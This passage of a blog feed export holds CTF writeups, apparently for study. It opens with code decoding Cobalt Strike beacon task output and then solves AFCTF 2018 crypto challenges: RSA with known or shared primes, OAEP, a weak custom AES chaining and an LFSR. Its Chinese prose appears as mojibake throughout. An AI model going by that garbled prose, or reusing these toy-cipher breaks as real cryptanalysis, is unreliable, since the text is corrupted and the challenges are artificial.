class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;counter:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(counter))<br><br>dec_length = dec[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]<br>dec_length=<span class="hljs-built_in">int</span>.from_bytes(dec_length, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ä»»åŠ¡è¿”å›é•¿åº¦:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(dec_length))<br><br>de_data= dec[<span class="hljs-number">8</span>:<span class="hljs-built_in">len</span>(dec)]<br>Task_type=de_data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>Task_type=<span class="hljs-built_in">int</span>.from_bytes(Task_type, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ä»»åŠ¡è¾“å‡ºç±»å‹:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(Task_type))<br><br><span class="hljs-built_in">print</span>(de_data[<span class="hljs-number">4</span>:dec_length])<br><span class="hljs-built_in">print</span>(hexdump.hexdump(dec))<br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong> æœ‰äº›é¢˜ç›®å¯ä»¥ä¼šä¸ç»™å‡º<code>.cobaltstrike.beacon_keys</code>ï¼Œå…·ä½“æ€è·¯å¯ä»¥å‚è€ƒä¸€é“å…·ä½“å¾—é¢˜ç›®<a href="https://ramoor.github.io/2025/07/25/NepCTF%202025%20Writeup/#%E5%AE%A2%E6%9C%8D%E5%B0%8F%E7%BE%8E">NepCTF 2025 Writeup å®¢æœå°ç¾- Ramoor</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFCTF 2018 Writeup</title>
    <link href="/2025/07/31/AFCTF%202018%20Writeup/"/>
    <url>/2025/07/31/AFCTF%202018%20Writeup/</url>
    
    <content type="html"><![CDATA[<p>NSSCTF Cryptoåˆ·é¢˜é€Ÿé€šè®°å½•ï¼Œç›®çš„æ˜¯æŸ¥æ¼è¡¥ç¼ºï¼Œæœ‰ç–‘é—®æ¬¢è¿äº¤æµÎ¾( âœ¿ï¼â—¡â›)</p><h1 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h1><p>ç»™äº†ä¸€ä¸ªå¾ˆé•¿çš„åå…­è¿›åˆ¶æ–‡ä»¶ï¼Œå¯¼å…¥CyberChefå¼€å§‹è§£ç ã€‚è¯´å®è¯ï¼Œæ„Ÿè§‰å‡ºé¢˜äººæœ‰ç‚¹æ— èŠäº†ã€‚<br>ä¸‹é¢æ˜¯è§£ç é¡ºåºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hex - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span> - hex - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - hex - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - hex - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base32</span> - hex - <span class="hljs-built_in">base32</span> - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span> - hex - <span class="hljs-built_in">base64</span> - <span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><h1 id="ä½ èƒ½çœ‹å‡ºè¿™æ˜¯ä»€ä¹ˆåŠ å¯†å—"><a href="#ä½ èƒ½çœ‹å‡ºè¿™æ˜¯ä»€ä¹ˆåŠ å¯†å—" class="headerlink" title="ä½ èƒ½çœ‹å‡ºè¿™æ˜¯ä»€ä¹ˆåŠ å¯†å—"></a>ä½ èƒ½çœ‹å‡ºè¿™æ˜¯ä»€ä¹ˆåŠ å¯†å—</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span><br><br>q=<span class="hljs-number">0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span><br><br>e=<span class="hljs-number">0x10001</span><br><br>c=<span class="hljs-number">0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span>Â Â  <br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p=<span class="hljs-number">0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f</span><br><br>q=<span class="hljs-number">0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061</span><br><br>e=<span class="hljs-number">0x10001</span><br><br>c=<span class="hljs-number">0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>n = p*q<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h1><p>ç›´æ¥åœ¨çº¿ç½‘ç«™ç ´è§£ï¼š<br><a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><h1 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h1><p>æ‘©æ–¯ç”µç è§£ç  -&gt; åå…­è¿›åˆ¶æ•°è½¬å­—ç¬¦</p><h1 id="Single"><a href="#Single" class="headerlink" title="Single"></a>Single</h1><p>è§‚å¯Ÿä»£ç å‘ç°æ˜¯å•è¡¨æ›¿æ¢åŠ å¯†ï¼Œç›´æ¥quipquipåœ¨çº¿è§£å¯†å³å¯ï¼š <a href="https://quipqiup.com/#google_vignette">https://quipqiup.com/#google_vignette</a></p><h1 id="å¯æ€œçš„RSA"><a href="#å¯æ€œçš„RSA" class="headerlink" title="å¯æ€œçš„RSA"></a>å¯æ€œçš„RSA</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span>ç¼–ç çš„å¯†æ–‡ å’Œ å…¬é’¥PEMæ–‡ä»¶<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>åœ¨çº¿è§£æå…¬é’¥æ–‡ä»¶å¾—åˆ°eå’Œn<br>ä½¿ç”¨factordbåˆ†è§£nå¾—åˆ°på’Œq<br>ç›´æ¥è¿›è¡Œè§£å¯†ä¼šå‘ç°ä¸èƒ½å‡ºflagï¼Œè¿™æ˜¯å› ä¸ºåŠ å¯†è¿‡ç¨‹ä¸­ä½¿ç”¨äº†OAEPå¡«å……<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br>n = <span class="hljs-number">79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span><br>e = <span class="hljs-number">65537</span><br>p =  <span class="hljs-number">3133337</span> <br>q = <span class="hljs-number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span><br>c = b64decode(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;å¯æ€œçš„RSA/flag.enc&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read())<br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>pk = RSA.construct((n,e,d,p,q))<br>cipher = PKCS1_OAEP.new(pk)<br>m = cipher.decrypt(c)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h1 id="One-Secret-Two-encryption"><a href="#One-Secret-Two-encryption" class="headerlink" title="One Secret, Two encryption"></a>One Secret, Two encryption</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">ä¸€ä»½ç§˜å¯†å‘é€ç»™ä¸¤ä¸ªäººä¸å¤ªå¥½å§ï¼Œé‚£æˆ‘å„è‡ªåŠ å¯†ä¸€æ¬¡å¥½å•¦~~~  <br>ç´ æ•°ç”Ÿæˆå¥½æ…¢å‘€  <br>å·ä¸ªæ‡’ä¹Ÿâ€¦â€¦ä¸ä¼šæœ‰é—®é¢˜çš„å§ï¼Ÿ<br></code></pre></td></tr></table></figure><p>é¢˜ç›®ç»™äº†ä¸¤ç»„å¯†æ–‡å’Œå…¬é’¥ï¼Œè§£æåå‘ç°ä¸¤ç»„å…¬é’¥çš„nä¸åŒï¼Œå¹¶ç»“åˆé¢˜ç›®æ‰€è¯´ï¼ŒçŒœæµ‹ä¸¤ä¸ªnåº”è¯¥å­˜åœ¨å…±åŒç´ æ•°ã€‚<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">4850297138162223468826481623082440249579136876798312652735204698689613969008632545220976699170308454082390834742570718247804202060929493571642074679428565168405877110681518105667301785653517697684490982375078989886040451115082120928982588380914609273008153977907950532498605486225883973643141516024058315360572988744607134110254489421516026937249163493982681336628726033489124705657217768229058487155865265080427488028921879608338898933540825564889012166181346177276639828346376362168934208822467295673761876965864573164529336885250577357767314256581019474130651412100897839606491189424373959244023695669653213498329</span><br>n2 = <span class="hljs-number">2367536768672000959668181171787295271898789288397672997134843418932405959946739637368044420319861797856771490573443003520137149324080217971836780570522258661419034481514883068092752166752967879497095564732505614751532330408675056285275354250157955321457579006360393218327164804951384290041956551855334492796719901818165788902547584563455747941517296875697241841177219635024461395596117584194226134777078874543699117761893699634303571421106917894215078938885999963580586824497040073241055890328794310025879014294051230590716562942538031883965317397728271589759718376073414632026801806560862906691989093298478752580277</span><br>e = <span class="hljs-number">65537</span><br>p = GCD(n1, n2)<br>q = n2 // p<br>c2 = bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;One Secret, Two encryption/flag_encry2&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read())<br>d = inverse(<span class="hljs-number">65537</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c2, d, n2)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="MagicNum"><a href="#MagicNum" class="headerlink" title="MagicNum"></a>MagicNum</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">72065910510177138000000000000000.000000<br>71863209670811371000000.000000<br>18489682625412760000000000000000.000000<br>72723257588050687000000.000000<br>4674659167469766200000000.000000<br>19061698837499292000000000000000000000.000000<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æœ¬é¢˜åº”è¯¥æ˜¯MISCé¢˜ï¼Œæ ¹æ®åˆ†æï¼Œé¢˜ç›®åº”è¯¥æ˜¯è¦è½¬æ¢æˆIEEE 754å•ç²¾åº¦æµ®ç‚¹æ•°å°ç«¯åºï¼Œç„¶åå†è½¬æ¢ASCIIå­—ç¬¦<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>nums = [<span class="hljs-number">72065910510177138000000000000000.000000</span>,<br>        <span class="hljs-number">71863209670811371000000.000000</span>,<br>        <span class="hljs-number">18489682625412760000000000000000.000000</span>,<br>        <span class="hljs-number">72723257588050687000000.000000</span>,<br>        <span class="hljs-number">4674659167469766200000000.000000</span>,<br>        <span class="hljs-number">19061698837499292000000000000000000000.000000</span><br>        ]<br>a = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums:<br>    i = <span class="hljs-built_in">float</span>(i)<br>    a += struct.pack(<span class="hljs-string">&#x27;&lt;f&#x27;</span>,i).<span class="hljs-built_in">hex</span>()  <span class="hljs-comment">#IEEE 754å•ç²¾åº¦æµ®ç‚¹æ•°å°ç«¯åºåå…­è¿›åˆ¶</span><br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(a,<span class="hljs-number">16</span>)))<br></code></pre></td></tr></table></figure><h1 id="MyOwnCBC"><a href="#MyOwnCBC" class="headerlink" title="MyOwnCBC"></a>MyOwnCBC</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MyOwnCBC</span>(<span class="hljs-params">key, plain</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key)!=<span class="hljs-number">32</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error!&quot;</span><br>cipher_txt = <span class="hljs-string">b&quot;&quot;</span><br>cipher_arr = []<br>cipher = AES.new(key, AES.MODE_ECB, <span class="hljs-string">&quot;&quot;</span>)<br>plain = [plain[i:i+<span class="hljs-number">32</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plain), <span class="hljs-number">32</span>)]<br><span class="hljs-built_in">print</span>(plain)<br>cipher_arr.append(cipher.encrypt(plain[<span class="hljs-number">0</span>]))<br>cipher_txt += cipher_arr[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(plain)):<br>cipher = AES.new(cipher_arr[i-<span class="hljs-number">1</span>], AES.MODE_ECB, <span class="hljs-string">&quot;&quot;</span>)<br>cipher_arr.append(cipher.encrypt(plain[i]))<br>cipher_txt += cipher_arr[i]<br><span class="hljs-keyword">return</span> cipher_txt<br><br>key = random.getrandbits(<span class="hljs-number">256</span>)<br>key = long_to_bytes(key)<br><br>s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>s = f.read()<br>f.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag_cipher&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(MyOwnCBC(key, s))<br>f.close()<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æ ¹æ®ä»£ç åˆ†æï¼Œå¯ä»¥å‘ç°é¢˜ç›®å¯¹æ˜æ–‡è¿›è¡Œäº†AESåˆ†ç»„åŠ å¯†ï¼Œä½†æ˜¯åªæœ‰ç¬¬ä¸€ç»„æ˜¯ä½¿ç”¨éšæœºç”Ÿæˆçš„å¯†é’¥åŠ å¯†çš„ï¼Œåé¢å…¶ä»–ç»„éƒ½æ˜¯ä½¿ç”¨å‰ä¸€ç»„çš„å¯†æ–‡ä½œä¸ºå¯†é’¥è¿›è¡ŒåŠ å¯†çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤äº†ç¬¬ä¸€ç»„ï¼Œå…¶ä»–æ‰€æœ‰ç»„çš„å¯†é’¥æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå¯ä»¥æ±‚å‡ºé™¤äº†ç¬¬ä¸€ç»„å¤–çš„æ‰€æœ‰æ˜æ–‡ã€‚<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;MyOwnCBC/flag_cipher&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>c = f.read()<br>f.close()<br><span class="hljs-comment">#print(c)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MyOwnCBC_decrypt</span>(<span class="hljs-params">cipher_txt</span>):<br>cipher_arr = [cipher_txt[i:i+<span class="hljs-number">32</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher_txt), <span class="hljs-number">32</span>)]<br>plain_txt = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-comment">#print(cipher_arr)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher_arr)-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>plain = AES.new(cipher_arr[i-<span class="hljs-number">1</span>], AES.MODE_ECB)<br><span class="hljs-comment">#print(cipher_arr[i-1])</span><br>plain_txt = plain.decrypt(cipher_arr[i]) + plain_txt<br><span class="hljs-keyword">return</span> plain_txt<br><br>m = MyOwnCBC_decrypt(c)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h1 id="Tiny-LFSR"><a href="#Tiny-LFSR" class="headerlink" title="Tiny LFSR"></a>Tiny LFSR</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify<br><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">4</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python Encrypt.py keyfile plaintext ciphername&quot;</span>)<br>exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr</span>(<span class="hljs-params">R, mask</span>):<br>output = (R &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>i=(R&amp;mask)&amp;<span class="hljs-number">0xffffffffffffffff</span><br>lastbit=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>lastbit^=(i&amp;<span class="hljs-number">1</span>)<br>i=i&gt;&gt;<span class="hljs-number">1</span><br>output^=lastbit<br><span class="hljs-keyword">return</span> (output,lastbit)<br><br>R = <span class="hljs-number">0</span><br>key = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>key = f.read()<br>R = <span class="hljs-built_in">int</span>(key,<span class="hljs-number">16</span>)<br>f.close<br><br>mask = <span class="hljs-number">0b1101100000000000000000000000000000000000000000000000000000000000</span><br><br>a = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [key[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-number">2</span>)]])<br><br>f=<span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">2</span>],<span class="hljs-string">&quot;r&quot;</span>)<br>ff = <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">3</span>],<span class="hljs-string">&quot;wb&quot;</span>)<br>s = f.read()<br>f.close()<br>lent = <span class="hljs-built_in">len</span>(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a)):<br>ff.write((<span class="hljs-built_in">ord</span>(s[i])^<span class="hljs-built_in">ord</span>(a[i])).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a), lent):<br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        (R,out)=lfsr(R,mask)<br>        tmp=(tmp &lt;&lt; <span class="hljs-number">1</span>)^out<br>    ff.write((tmp^<span class="hljs-built_in">ord</span>(s[i])).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br>ff.close()<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>é¢˜ç›®ç»™å‡ºäº†ä¸€ç»„å¯¹åº”çš„æ˜å¯†æ–‡æ–‡ä»¶ï¼Œæˆ‘ä»¬é€šè¿‡åˆ†æå¯ä»¥å‘ç°ï¼Œé€šè¿‡æ˜å¯†æ–‡ç›´æ¥å¼‚æˆ–çš„å‰ä¸€éƒ¨åˆ†ä¾¿æ˜¯keyã€‚<br>å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ¢å¤å‡ºkeyï¼Œç”±äºåŠ è§£å¯†éƒ½æ˜¯å¼‚æˆ–æ“ä½œï¼Œæ‰€ä»¥ä½¿ç”¨å¾—åˆ°çš„å¯†é’¥ï¼Œç»“åˆé¢˜ç›®æ–‡ä»¶çš„åŠ å¯†å†å¯¹<code>flag_encode.txt</code>è¿›è¡Œä¸€æ¬¡åŠ å¯†å³å¯å¾—åˆ°æ˜æ–‡ã€‚<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 